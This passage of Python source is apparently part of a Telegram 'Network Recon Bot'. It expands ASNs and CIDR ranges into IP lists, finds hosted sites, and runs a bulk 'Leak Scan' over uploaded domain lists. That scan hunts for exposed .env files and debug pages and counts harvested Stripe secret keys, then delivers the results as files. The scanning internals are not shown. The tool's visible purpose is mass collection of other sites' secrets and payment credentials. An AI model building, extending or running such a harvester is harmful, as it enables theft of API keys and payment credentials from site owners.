        return

    prefix = parts[1].strip()
    max_ips = DEFAULT_IPS_PER_PREFIX
    if len(parts) > 2 and parts[2].isdigit():
        max_ips = min(int(parts[2]), 128)

    if get_scan(message.chat.id):
        bot.reply_to(message, "⚠️ Scan running.")
        return

    ips = prefix_to_ips(prefix, max_ips)
    if not ips:
        bot.reply_to(message, f"❌ Invalid CIDR: <code>{prefix}</code>")
        return

    status_msg = bot.send_message(message.chat.id,
        f"🌐 <b>Site Scan</b>\n📍 {prefix}\n🎯 {fmt_num(len(ips))} IPs\n\n"
        f"<code>{progress_bar(0)}</code> Starting...",
        reply_markup=make_cancel_button())

    set_scan(message.chat.id, "scan")
    try:
        sites, found, scanned, elapsed = run_ip_scan(message.chat.id, ips, status_msg.message_id)
    finally:
        clear_scan(message.chat.id)

    summary = (
        f"✅ <b>Scan Complete</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📍 {prefix}\n\n"
        f"<code>{progress_bar(100)}</code> 100%\n\n"
        f"📊 Scanned: {fmt_num(scanned)}\n"
        f"🟢 Hosts: {fmt_num(found)}\n"
        f"🌐 Sites: {fmt_num(len(sites))}\n"
        f"🕐 {fmt_time(elapsed)}"
    )
    try:
        bot.edit_message_text(summary, message.chat.id, status_msg.message_id)
    except Exception:
        bot.send_message(message.chat.id, summary)

    if sites:
        safe = prefix.replace("/", "_").replace(".", "-")
        bot.send_document(
            message.chat.id,
            make_txt_file("\n".join(sorted(sites)), f"sites_{safe}.txt"),
            caption=f"🌐 {fmt_num(len(sites))} sites",
            reply_markup=make_back_button()
        )
    else:
        bot.send_message(message.chat.id, "😕 No sites found.", reply_markup=make_back_button())


@bot.message_handler(commands=["ip"])
def cmd_ip(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id, "📡 Usage: <code>/ip 8.8.8.8</code>",
                        reply_markup=make_back_button())
        return

    ip = parts[1].strip()
    status_msg = bot.send_message(message.chat.id,
        f"📡 Looking up {ip}...\n<code>{progress_bar(30)}</code>")

    result = scan_ip_fast(ip)
    asn_num, asn_holder, prefix = ip_to_asn(ip)

    s = [f"📡 <b>IP Lookup</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n📍 <code>{ip}</code>\n"]
    if result["domains"]:
        s.append("🌐 <b>Domains:</b>")
        for d in sorted(result["domains"]):
            s.append(f"  → <code>{d}</code>")
        s.append("")
    if result["title"]:
        s.append(f"📄 <b>Title:</b> {result['title']}")
    if result["server"]:
        s.append(f"🖥 <b>Server:</b> {result['server']}")
    if asn_num:
        s.append(f"\n🔗 <b>Network:</b>\n  ASN: <code>AS{asn_num}</code>\n  Holder: {asn_holder}\n  Prefix: <code>{prefix}</code>")

    try:
        bot.edit_message_text("\n".join(s), message.chat.id, status_msg.message_id,
                            reply_markup=make_back_button())
    except Exception:
        bot.send_message(message.chat.id, "\n".join(s), reply_markup=make_back_button())


# ═══════════════════════════════════════════════
#  /leak — Leak Scan (direct + file upload)
# ═══════════════════════════════════════════════

def _leak_worker(chat_id, sites, status_msg_id, step_name="Leak Scan", scan_type="both"):
    set_scan(chat_id, "leak")
    try:
        counters, sk_keys_copy, sk_sites_copy, elapsed = run_leak_scan(
            chat_id, sites, status_msg_id, step_name, scan_type
        )
    except Exception as e:
        log.error(f"Leak scan error: {e}")
        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}", reply_markup=make_back_button())
        clear_scan(chat_id)
        return

    env_total = counters["env_http"] + counters["env_https"]
    summary = (
        f"✅ <b>{step_name} Complete</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{progress_bar(100)}</code> 100%\n\n"
        f"🎯 Sites: <b>{fmt_num(len(sites))}</b>\n"
    )

    if scan_type in ("env", "both"):
        summary += (
            f"📄 .env (HTTP): <b>{counters['env_http']}</b>\n"
            f"🔐 .env (HTTPS): <b>{counters['env_https']}</b>\n"
            f"🔓 Exposed: <b>{env_total}</b>\n"
        )

    if scan_type in ("debug", "both"):
        summary += f"🐛 Debug: <b>{counters['debug']}</b>\n"

    summary += (
        f"💳 Stripe keys: <b>{len(sk_keys_copy)}</b>\n\n"
        f"🕐 Time: {fmt_time(elapsed)}"
    )

    try:
        bot.edit_message_text(summary, chat_id, status_msg_id)
    except Exception:
        bot.send_message(chat_id, summary)

    deliver_leak_files(chat_id, "leak")
    bot.send_message(chat_id, "🏁 Done.", reply_markup=make_back_button())
    clear_scan(chat_id)


@bot.message_handler(commands=["leak"])
def cmd_leak(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id,
            "🔓 <b>Leak Scan</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<b>Option 1 — Direct:</b>\n"
            "<code>/leak site1.com site2.com</code>\n\n"
            "<b>Option 2 — File upload:</b>\n"
            "<code>/leak file</code>\n"
            "Then upload .txt with domains\n\n"
            "<b>Example file:</b>\n"
            "<code>site1.com\nsite2.com\nsite3.com</code>",
            reply_markup=make_back_button())
        return

    # File upload mode
    if parts[1].lower() in ("file", "upload", "txt"):
        if get_scan(message.chat.id):
            bot.reply_to(message, "⚠️ Scan running. Use /cancel first.")
            return

        bot.send_message(message.chat.id,
            "📎 <b>Upload .txt file</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "One domain per line:\n"
            "<code>site1.com\nsite2.com\nsite3.com</code>\n\n"
            "📎 Send file now...",
            reply_markup=make_back_button())
        bot.register_next_step_handler(message, process_leak_file)
        return

    # Direct mode — background thread
    sites = [parse_url(p) for p in parts[1:] if p.strip()]

    if not sites:
        bot.reply_to(message, "❌ No valid domains.")
        return

    if get_scan(message.chat.id):
        bot.reply_to(message, "⚠️ Scan running.")
        return

    status_msg = bot.send_message(message.chat.id,
        f"🔓 <b>Leak Scan</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 Sites: <b>{fmt_num(len(sites))}</b>\n\n"
        f"<code>{progress_bar(0)}</code> Starting...",
        reply_markup=make_cancel_button())

    run_in_background(_leak_worker, message.chat.id, sites, status_msg.message_id)


def process_leak_file(message):
    if not message.document:
        bot.send_message(message.chat.id, "❌ No file. Use /leak file again.")
        return

    if get_scan(message.chat.id):
        bot.send_message(message.chat.id, "⚠️ Scan running.")
        return

    try:
        fi = bot.get_file(message.document.file_id)
        content = bot.download_file(fi.file_path).decode("utf-8", errors="ignore")
        lines = [l.strip() for l in content.splitlines() if l.strip()]
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Cannot read: {e}")
        return

    if not lines:
        bot.send_message(message.chat.id, "❌ File empty.")
        return

    sites = []
    for l in lines:
        clean = parse_url(l)
        if clean and "." in clean:
            sites.append(clean)

    sites = list(set(sites))

    if not sites:
        bot.send_message(message.chat.id, "❌ No valid domains.")
        return

    with scan_lock:
        active_scans[f"{message.chat.id}_leak_sites"] = sites

    bot.send_message(message.chat.id,
        f"🔓 <b>Leak Scan — File Loaded</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📋 Sites: <b>{fmt_num(len(sites))}</b>\n"
        f"⏱ ETA: ~{fmt_time(len(sites) * 2 / MAX_THREADS)}\n\n"
        f"Select scan type 👇",
        reply_markup=make_leak_type_buttons())


@bot.callback_query_handler(func=lambda call: call.data.startswith("leaktype_"))
def cb_leak_type(call):
    chat_id = call.message.chat.id
    scan_type = call.data.split("_")[1]

    with scan_lock:
        sites = active_scans.pop(f"{chat_id}_leak_sites", None)

    if not sites:
        bot.answer_callback_query(call.id, "No pending. Use /leak file.")
        return

    bot.answer_callback_query(call.id)

    msg_id = call.message.message_id

    type_label = {
        "env": ".env Scan",
        "debug": "Debug Scan",
        "both": "Full Leak Scan"
    }.get(scan_type, "Leak Scan")

    bot.edit_message_text(
        f"🔓 <b>{type_label}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 Sites: <b>{fmt_num(len(sites))}</b>\n"
        f"⚡ Threads: {MAX_THREADS}\n\n"
        f"<code>{progress_bar(0)}</code> Starting...",
        chat_id, msg_id, reply_markup=make_cancel_button()
    )

    run_in_background(_leak_worker, chat_id, sites, msg_id, type_label, scan_type)


# ═══════════════════════════════════════════════
#  /chain — Full trace
# ═══════════════════════════════════════════════

@bot.message_handler(commands=["chain"])
def cmd_chain(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id,
            "🔗 <b>Full Chain</b>\n\n"
            "Usage: <code>/chain google.com</code>",
            reply_markup=make_back_button())
        return

    domain = parse_url(parts[1])
    status_msg = bot.send_message(message.chat.id,
        f"🔗 <b>Full Chain</b>\n🎯 {domain}\n\n<code>{progress_bar(10)}</code>")

    steps = [f"🔗 <b>Full Chain: {domain}</b>\n━━━━━━━━━━━━━━━━━━━━━\n"]

    ip = resolve_any(domain)
    if not ip:
        bot.edit_message_text(f"❌ Cannot resolve {domain}",
            message.chat.id, status_msg.message_id, reply_markup=make_back_button())
        return

    steps.append(f"1️⃣ Domain → IP: <code>{ip}</code>")
    try:
        ptr = socket.gethostbyaddr(ip)[0]
        steps.append(f"2️⃣ Reverse DNS: <code>{ptr}</code>")
    except Exception:
        steps.append("2️⃣ Reverse DNS: —")

    asn_num, asn_holder, prefix = ip_to_asn(ip)
    if asn_num:
        steps.append(f"3️⃣ IP → ASN: <code>AS{asn_num}</code>\n   {asn_holder}\n   Prefix: {prefix}")

    if asn_num:
        prefixes, err = asn_to_prefixes(asn_num)
        if not err:
            steps.append(f"4️⃣ ASN → Prefixes: <b>{fmt_num(len(prefixes))}</b>")
            if prefixes:
                bot.send_document(message.chat.id,
                    make_txt_file("\n".join(sorted(prefixes)), f"prefixes_AS{asn_num}.txt"),
                    caption=f"📦 AS{asn_num} — {fmt_num(len(prefixes))} prefixes")

    try:
        bot.edit_message_text("\n".join(steps), message.chat.id,
            status_msg.message_id, reply_markup=make_back_button())
    except Exception:
        bot.send_message(message.chat.id, "\n".join(steps), reply_markup=make_back_button())


# ═══════════════════════════════════════════════
#  /batch — File upload IP scan
# ═══════════════════════════════════════════════

def _batch_worker(chat_id, all_ips, msg_id):
    set_scan(chat_id, "batch")

    CHUNK = 10000
    chunks = [all_ips[i:i+CHUNK] for i in range(0, len(all_ips), CHUNK)] if len(all_ips) > CHUNK else [all_ips]

    all_domains = set()
    total_found = 0
    total_scanned = 0
    total_time = 0

    try:
        for chunk in chunks:
            if not get_scan(chat_id):
                break
            domains, found, scanned, elapsed = run_ip_scan(chat_id, chunk, msg_id)
            all_domains.update(domains)
            total_found += found
            total_scanned += scanned
            total_time += elapsed
    except Exception as e:
        log.error(f"Batch error: {e}")
        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}", reply_markup=make_back_button())
        clear_scan(chat_id)
        return

    summary = (
        f"✅ <b>Batch Complete</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{progress_bar(100)}</code> 100%\n\n"
        f"📊 {fmt_num(total_scanned)} IPs · 🟢 {fmt_num(total_found)} hosts\n"
        f"🌐 Domains: <b>{fmt_num(len(all_domains))}</b>\n"
        f"🕐 {fmt_time(total_time)}"
    )
    try:
        bot.edit_message_text(summary, chat_id, msg_id)
    except Exception:
        bot.send_message(chat_id, summary)

    if all_domains:
        bot.send_document(chat_id,
            make_txt_file("\n".join(sorted(all_domains)), "batch_sites.txt"),
            caption=f"🌐 {fmt_num(len(all_domains))} domains",
            reply_markup=make_back_button())
    else:
        bot.send_message(chat_id, "😕 No sites.", reply_markup=make_back_button())

    clear_scan(chat_id)


@bot.message_handler(commands=["batch"])
def cmd_batch(message):
    bot.send_message(message.chat.id,
        "📦 <b>Batch Scan</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Upload a <code>.txt</code> with CIDRs or IPs.\n\n"
        "📎 Send file now...",
        reply_markup=make_back_button())
    bot.register_next_step_handler(message, process_batch_file)


def process_batch_file(message):
    if not message.document:
        bot.send_message(message.chat.id, "❌ No file.")
        return
    if get_scan(message.chat.id):
        bot.send_message(message.chat.id, "⚠️ Scan running.")
        return

    try:
        fi = bot.get_file(message.document.file_id)
        content = bot.download_file(fi.file_path).decode("utf-8", errors="ignore")
        lines = [l.strip() for l in content.splitlines() if l.strip()]
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ {e}")
        return

    cidrs = [l for l in lines if "/" in l]
    singles = [l for l in lines if "/" not in l]

    with scan_lock:
        active_scans[f"{message.chat.id}_pending"] = {"cidrs": cidrs, "singles": singles}

    bot.send_message(message.chat.id,
        f"📦 <b>File loaded</b>\n\n"
        f"CIDRs: {fmt_num(len(cidrs))}\n"
        f"IPs: {fmt_num(len(singles))}\n\n"
        f"Select depth 👇",
        reply_markup=make_batch_depth_buttons())


@bot.callback_query_handler(func=lambda call: call.data.startswith("batch_"))
def cb_batch(call):
    chat_id = call.message.chat.id
    max_ips = int(call.data.split("_")[1])

    with scan_lock:
        pending = active_scans.pop(f"{chat_id}_pending", None)

    if not pending:
        bot.answer_callback_query(call.id, "No pending.")
        return

    bot.answer_callback_query(call.id)

    all_ips = list(pending["singles"])
    for c in pending["cidrs"]:
        all_ips.extend(prefix_to_ips(c, max_ips))
    all_ips = list(set(all_ips))

    if not all_ips:
        bot.send_message(chat_id, "❌ No valid IPs.")
        return

    bot.edit_message_text(
        f"📦 <b>Batch</b>\n🎯 {fmt_num(len(all_ips))} IPs\n\n"
        f"<code>{progress_bar(0)}</code> Starting...",
        chat_id, call.message.message_id, reply_markup=make_cancel_button())

    run_in_background(_batch_worker, chat_id, all_ips, call.message.message_id)


# ═══════════════════════════════════════════════
#  /cancel /status
# ═══════════════════════════════════════════════

@bot.message_handler(commands=["cancel"])
def cmd_cancel(message):
    if get_scan(message.chat.id):
        clear_scan(message.chat.id)
        bot.send_message(message.chat.id, "🛑 Cancelled.", reply_markup=make_back_button())
    else:
        bot.send_message(message.chat.id, "✅ Nothing running.", reply_markup=make_back_button())


@bot.message_handler(commands=["status"])
def cmd_status(message):
    s = get_scan(message.chat.id)
    status = f"🔍 {s}" if s else "✅ Idle"
    bot.send_message(message.chat.id,
        f"🤖 <b>Status</b>\n\nRunning: {status}\nThreads: {MAX_THREADS}",
        reply_markup=make_back_button())


# ═══════════════════════════════════════════════
#  CALLBACK HANDLERS (Menu)
# ═══════════════════════════════════════════════

@bot.callback_query_handler(func=lambda call: call.data == "menu_main")
def cb_main(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "🌐 <b>Network Recon Bot</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        "ASN · Sites · IPs · Leaks\n"
        "Batch · Chain · 🚀 Pipeline\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\nSelect 👇",
        call.message.chat.id, call.message.message_id, reply_markup=make_main_menu())


@bot.callback_query_handler(func=lambda call: call.data == "menu_pipeline")
def cb_pipeline(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "🚀 <b>Full Pipeline</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        "ASN → Prefixes → Sites → Leak Scan → Files\n\n"
        "<b>Usage:</b> <code>/pipeline 15169</code>\n\n"
        "⚠️ Heavy scan. Files auto-delivered.",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_asn")
def cb_asn(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "🔍 <b>ASN Lookup</b>\n\nUsage: <code>/asn 15169</code>",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_scan")
def cb_scan(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "🌐 <b>Site Scan</b>\n\nUsage: <code>/scan 1.0.0.0/24</code>",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_ip")
def cb_ip(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "📡 <b>IP Lookup</b>\n\nUsage: <code>/ip 8.8.8.8</code>",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_leak")
def cb_leak(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "🔓 <b>Leak Scan</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>Direct:</b> <code>/leak site.com</code>\n\n"
        "<b>File:</b> <code>/leak file</code>\n"
        "Upload .txt with domains",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_chain")
def cb_chain(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "🔗 <b>Full Chain</b>\n\nUsage: <code>/chain google.com</code>",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_batch")
def cb_batch_menu(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "📦 <b>Batch Scan</b>\n\nUsage: <code>/batch</code> then upload file",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_settings")
def cb_settings(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        f"⚙️ <b>Settings</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Threads: <b>{MAX_THREADS}</b>\n"
        f"IPs/prefix: <b>{DEFAULT_IPS_PER_PREFIX}</b>\n"
        f"Scan timeout: <b>{SCAN_TIMEOUT}s</b>\n"
        f"Leak timeout: <b>{LEAK_TIMEOUT}s</b>\n"
        f"Batch size: <b>{LEAK_BATCH_SIZE}</b>\n"
        f"Max leak sites: <b>Unlimited</b>",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_status")
def cb_status(call):
    bot.answer_callback_query(call.id)
    s = get_scan(call.message.chat.id)
    status = f"🔍 {s}" if s else "✅ Idle"
    bot.edit_message_text(
        f"🤖 <b>Status</b>\n\nRunning: {status}\nThreads: {MAX_THREADS}",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "menu_help")
def cb_help(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        "📖 <b>Help</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <code>/pipeline 15169</code>\n"
        "🔍 <code>/asn 15169</code>\n"
        "🌐 <code>/scan 1.0.0.0/24</code>\n"
        "📡 <code>/ip 8.8.8.8</code>\n"
        "🔓 <code>/leak site.com</code>\n"
        "🔓 <code>/leak file</code>\n"
        "🔗 <code>/chain site.com</code>\n"
        "📦 <code>/batch</code>\n"
        "🛑 <code>/cancel</code> · 📊 <code>/status</code>",
        call.message.chat.id, call.message.message_id, reply_markup=make_back_button())


@bot.callback_query_handler(func=lambda call: call.data == "cancel_scan")
def cb_cancel(call):
    bot.answer_callback_query(call.id)
    if get_scan(call.message.chat.id):
        clear_scan(call.message.chat.id)
        bot.edit_message_text("🛑 <b>Cancelled.</b>",
            call.message.chat.id, call.message.message_id, reply_markup=make_back_button())
    else:
        bot.answer_callback_query(call.id, "Nothing running.")


# ═══════════════════════════════════════
#  Main
# ═══════════════════════════════════════
if __name__ == "__main__":
    log.info("Bot starting...")
    log.info(f"Threads: {MAX_THREADS}")

    # Drop stale updates from previous instance — prevents 409 Conflict
    try:
        bot.drop_pending_updates()
    except Exception as e:
        log.warning(f"drop_pending_updates failed: {e}")

    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            log.error(f"Polling error: {e}")
            time.sleep(5)